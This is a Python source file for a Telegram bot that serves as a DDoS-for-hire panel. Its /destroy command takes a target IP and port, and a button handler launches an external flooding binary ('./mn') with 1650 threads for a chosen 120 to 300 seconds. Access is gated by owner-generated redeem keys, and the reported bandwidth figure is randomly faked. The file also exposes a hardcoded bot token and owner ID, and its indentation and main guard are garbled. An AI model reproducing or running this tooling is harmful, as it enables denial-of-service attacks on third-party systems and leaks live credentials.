import subprocess
import time
import random
import string
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

Hardcoded Token and Owner ID

BOT_TOKEN = "7312643382:AAGpdhy5Bpcd032gbCvdnXf9AvOYR3rkm08"
OWNER_ID = 5879359815

REDEEM_KEYS = set()

def generate_key(): return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text("WELCOME TO THE BOT!", parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE): help_text = """ Available Commands:

/destroy [ip] [port] - Start attack with a specific time (buttons appear for time)
/genkey - Generate redeem key (Owner only)
/redeem [key] - Redeem key for access
/ping - Check bot speed
/broadcast [message] - Owner only """ await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE): start_time = time.time() await update.message.reply_text("Pinging...") end_time = time.time() latency = (end_time - start_time) * 1000 await update.message.reply_text(f"Bot speed: {int(latency)} ms")

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE): if update.effective_user.id != OWNER_ID: await update.message.reply_text("Only owner can generate keys.") return key = generate_key() REDEEM_KEYS.add(key) await update.message.reply_text(f"Generated Key: {key}", parse_mode=ParseMode.MARKDOWN)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE): if len(context.args) < 1: await update.message.reply_text("Please provide a key to redeem.") return key = context.args[0] if key in REDEEM_KEYS: REDEEM_KEYS.remove(key) await update.message.reply_text("Key redeemed successfully. You can now use the bot.") else: await update.message.reply_text("Invalid or used key.")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE): if update.effective_user.id != OWNER_ID: await update.message.reply_text("Only the owner can broadcast messages.") return message = ' '.join(context.args) await context.bot.send_message(chat_id=update.message.chat_id, text=f"BROADCAST:\n{message}")

async def destroy(update: Update, context: ContextTypes.DEFAULT_TYPE): if len(context.args) != 2: await update.message.reply_text("Usage: /destroy [ip] [port]") return

ip, port = context.args
context.user_data["ip"] = ip
context.user_data["port"] = port

keyboard = [
    [InlineKeyboardButton("120 seconds", callback_data="120")],
    [InlineKeyboardButton("180 seconds", callback_data="180")],
    [InlineKeyboardButton("250 seconds", callback_data="250")],
    [InlineKeyboardButton("300 seconds", callback_data="300")]
]

reply_markup = InlineKeyboardMarkup(keyboard)
await update.message.reply_text("Select the attack duration:", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query await query.answer()

selected_time = int(query.data)
ip = context.user_data.get("ip")
port = context.user_data.get("port")

if not ip or not port:
    await query.edit_message_text("No IP or Port set. Please use /destroy again.")
    return

await query.edit_message_text(text=f"**Attack started for {selected_time} seconds!**", parse_mode=ParseMode.MARKDOWN)

try:
    proc = subprocess.Popen(["./mn", ip, port, str(selected_time), "--threads", "1650"])
    proc.wait()

    data_used = random.randint(50, 200)
    await query.message.reply_text(f"**Attack finished!**\nData used: {data_used} MB", parse_mode=ParseMode.MARKDOWN)
except Exception as e:
    await query.message.reply_text(f"Error during attack: {e}")

if name == "main": app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("ping", ping))
app.add_handler(CommandHandler("genkey", genkey))
app.add_handler(CommandHandler("redeem", redeem))
app.add_handler(CommandHandler("broadcast", broadcast))
app.add_handler(CommandHandler("destroy", destroy))
app.add_handler(CallbackQueryHandler(button_handler))

print("Bot is running...")
app.run_polling()

